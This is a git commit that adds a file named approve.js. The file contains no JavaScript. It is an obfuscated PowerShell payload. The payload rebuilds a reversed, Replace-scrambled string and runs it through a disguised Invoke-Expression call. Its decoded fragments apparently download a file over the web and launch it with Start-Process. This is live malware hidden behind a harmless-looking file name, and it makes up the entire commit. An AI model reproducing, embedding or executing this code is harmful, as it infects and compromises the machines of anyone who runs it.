0d98f18d85a32b6c74fe44bd522378e3ab5d8272
Azkic50 <Azkilohj55@gmail.com>
2025-03-20 14:58:06 -0400

    Create approve.js

---
+++ approve.js
@@ -0,0 +1,22 @@
+$vnu3= [char[ ] ] ") )43]rAHC[]GNIrTs[,'4we'(ECalpeR.)63]rAHC[]GNIrTs[,)601]rAHC[+07]rAHC[+08]rAHC[((ECalpeR.)93]rAHC[]GNIrTs[,)501]rAHC[+89]rAHC[+67]rAHC[((ECalpeR.)' ) )29]raHC[]GNIRTs[,ibLsJhibL(ecalPER.)93]raHC[]GNIRTs[,)55]raHC[+97]raHC[+401]raHC[((ecalPER.)63]raHC[]GNIRTs[,ibLeipibL(ecalP'+'ER.))ibLOhyMG,y'+'MG/:spyMG,yMG/7Oh+7OhyMG 7Oh+7Ohf- t'+'dG}7Oh+7Oh9{}7Oh+7O'+'h01{}77Oh+7Oh{}8{}ibL,ibLh({@]tce'+'jbOmotsu7ibL,ibL+7ibL'+',ibL;tdG'+')7Oh'+'+7Ohb.7Oh+7OhiH'+'s5(Hs7Oh+ibL,ibLOh+7Ohy7Oh+7OhM7'+'Oh+7OhG,yMGsse7Oh+'+'7OhcyMG f-td7Oh+7OhG}7Oh+7Oh0{}7Oh+7Oh3{}27Oh+7Oh{}17OibL,ibLyM'+'7Oh+7Ohi'+'bL,ibLhC'+'[+511]rAhC[+ibL,ibLEr.)4ibL,ibL7Oh+7Oh
+{ yrt7Oh+7ibL,ibL'+'d7Oh+7Ohnu7O'+'hibL,'+'ibLha7Oh+7ibL,ib'+'LOh+7Oh 
+} 7Oh+7Oh   
+;}'+'H7Oh+7'+'OhTApfA4E7Oh+7OhL7Oh+7OhfA4ifA7Oh+7Oh'+'47Oh+7OhF{7OhibL,ibLOh    
+{ ibL,ibL7Oh}E'+'UfA4rT{'+'7Oh+ibL,ibLMET7Oh+7Oh:vibL,ibL 
+;7'+'Oh+7Oh)
+})7O'+'h+7OhyMGGyMG,ibL,ibLeip ( .ibL,ibL7Ohm.SPGyMG,yMGiyMG,yMibL,ibL7Oh+7OhGPCMyMG7Oh+7Oh,7Oh+7OhyMGUyMG,yibL'+',ibLOh{tdG7Oh+7Oh( 7Oh+7Oh='+' )yMibL,ibL3{7Oh+7Oh}0{7Oh+7Oh}6'+'7Oh+7Oh'+'{}2{}7Oh+7Oh1{}4{}5{tdG7Oh+7Oh( = 7Oh+7'+'Oh'+')y7Oh+7OhMGayMG7Oh+7Oib'+'L,ibLOh+7OhGp7Oh+'+'7Ohohs.7O'+'h+7Oha7Oh+7OhaibL,ib'+'L,yMGhyMG,yMGtseTyMG,y7'+'Oh+7Oh'+'MGP-yMGf- t7Oh+7OhdG}2{}3'+'{}0{7Oh+7Oh}1{td7Oh+7OhG(7Oh+7ibL,ibL+7OhpakayMG,yMG7Oh+7OhhyM7Oh+7OhG,yMGt7Oh+7Oh'+'ty7'+'Oh+7OhMG,yMGW7Oh+7OhyM'+'G7Oh+7Oh,yMGw/7Oh+7ibL,ibLIrtS[,)2'+'7]ibL,ibL7ibL,ibL  7Oh+7'+'Oh  7Oh+7Oh 7Oh+ibL,ibL+7Oh '+'   7Oh+7Oh
+{ )}htA7Oh+7OhfA4PEfA4lIf7Oh+7Oh{ibL,ibLOhOLNibL,ibLneH7Oh+7Ohs5td'+'7Oh+7OhG = }HTAPfA4elfA4i7ibL,ibLOh+7OhCSP[ 7Oh+7Oh 7Oh+7Oh
+(@ 7Oh+7Oh= }A7Oh+7OhTA7Oh+7ibL,ibL35]rAhC[((ecalPibL,ibLc7Oh+7Oh2P7Oh+7OhibL,ibL7Oh 
+}      
+ 7Oh+7Oh;}hTfA4APefA7Oh+7Oh4LIF{Hs57Oh+7Oh 7Oh+7OheliFtuO- t7Oh+'+'7OhdGatd'+'G7Oh+7Oh.7Oh+7Oh}I{Hs5 7Oh+7Ohi7Oh+7OhribL,ibL3]rAhC[]GNIrtS[,)611]rAhC[+001]rAhC[+1'+'7]rAhC[ibL,ibL+7OhA4emO7O'+'h+7Ohs7Oh+7Oh{7Oh+'+'7OibL,ibL7Oh+7OhGbyMG( 7Oh+7Oh;)yMGs7Oh+ibL'+',ibL(ecalPEr.)7OhsJh7Oh,)89]rAhi'+'bL,ibLOh&( 7Oh+7Ohfi  7Oh+7Oh    
+;7Oh+ibL,ibLalPEr.)7Oh 7Oh+7Oh 
+
+}  
+7Oh+7Oh}    
+{ hc'+'tac   7ibL,ibLhHs5  
+
+7Oh('+'()7OhX7Oh+]31[dilLEhseip+]1[dILlEHSi'+'bL,ibL7Oh+7OhLnwfA4oD{Hs7Oh+7Oh57Oh+7Oh    7OhibL,ibLh+7OhibL,ibL7OhHs5 = }D7Oh+7OibL,ibLGU7Oh+7OhPCMWy7Oh+7OhMG,yMG7Oh+7Ohism.SPyM7O'+'h+7OhGf7Oh+7Oh-tdGibL'+',ibLC[+99]rAhC[+05]rAhC[((ecalPEr.)63]rAhC[]GNibL,ibLOh}2{ibL,ib'+'L7Oh+7OhibL,ibL    
+ }'+' 7Oh+7Oh   7Oh+7Oh  
+;}esfA4LfA47Oh+7OhAf{Hs5 '+'='+'7Oh+7Oh }7Oh+7OhDA7Oh+'+'7OhfA4oibL,'+'ibLOh
+{ 7Oh+7Oh)7Oh+7O'+'h}DAfA4ol7Oh+7OhfA7Oh+7Oh4NWoD{Hs7Oh+7Oh5( fi  ibL,ibL}07Oh+7Oh{}1{}5{tdG(.        '+'7Oh+7ibL,ibLHs5 )y7Oh+7'+'OhMGta7OhibL'+',ibLOh5bibL,ibLG-tr'+'atS7ibL,ibLrAibL,ibLU- )yMG7Oh+7OhIyMG'+'ibL,ibLOhH7Oh+7Ohs5 7Oh+7Oh)yMGo7OibL,ibL7Oh+7Oh f- tdG}47Oh+7Oh{}37Oh+7Oh{7Oh+'+'7ibL,ibLWOfA4d{Hs5      
+ibL,ibLhibL,ibLh+7OhryMG,yMGPy7Oh+7OhMG,yM7OibL,ibL((ecalPEr.)93'+']rAhC[]GNIrtS[,)121]rAhC[+77]rAhC[+17]rAhC[((ecibL,ibL) )69]rAhC['+']GNIrtS[,ibL,ibLh+7O'+'h{tdG(.7Oh+7OhibL,ibLOhfA7Oh+7Oh4Df7Oi'+'bL,ibLM7ibL,ibL7'+'Oh+7Oh,yMGdohtyMG,yMGeMtyMG,7Oh+7OhyMGs'+'eR7Oh+7Oh-y7Oh+7OhMG,yMGv7Oh+7Oh'+'nyM7Oh+7OhG,yMGe7Oh+7Oh'+'k7Oh+7OhoyMGib'+'L,ibLOh+7OhF{Hs5      '+'ibL,'+'ibL7'+'OhfA47O'+'hibL,ibL+7Ohy7Oh+7OhMGibL,ibL)}atAfA7Oh+7Oh4D7Oh+7'+'Ohe7Oh+7Ohmof7Oh+7O'+'hA47Oh+7Ohs{7Oh+7Oh'+'H7Oh+7Ohs5 ni }'+'I{H'+'s5( h7Oh+7Ohca7Oh+7Oher7Oh+7Ohof 7Oh+7OhibL'+',ibL}0{}7Oh+7Oh27Oh+7Oh{7Oh+7Oh}17Oh+7ibL f-4we}9{}3{}43{}62{}74{}71{}56{}04{}46{}73{}01{}23{}06{}96{}51{}11{}92{}81'+'{}76{'+'}8{}'+'54{}83{}61{}5{}41{}52{}12{}22{}32{}03{}44{}02{}2{}94{}33{'+'}85{}82{}16{'+'}34{}31{}42{}86{}64{}91{}93{}'+'75{}24{}4{}36{}95{}1{}65{}66{}72{}0{}'+'25{}53{}45{}35{}6{}05{}26{}84{}17{}15{}07{}14{}7{}2'+'1{}63{}13{}55{4w'+'e((()ibLib'+'LnIoJ-]52,'+'62,4[CEPsmoc:vnejFP (. '(( )'X'+]31[diLlehs$+]1[diLlEhS$ ( &"; [ARrAY]::reVERsE( (Dir  varIAbLe:vnU3  ).VALUE) ; [stRING]::jOIn( '', (Dir  varIAbLe:vnU3  ).VALUE) |&( $PsHomE[21]+$PSHOmE[30]+'x')
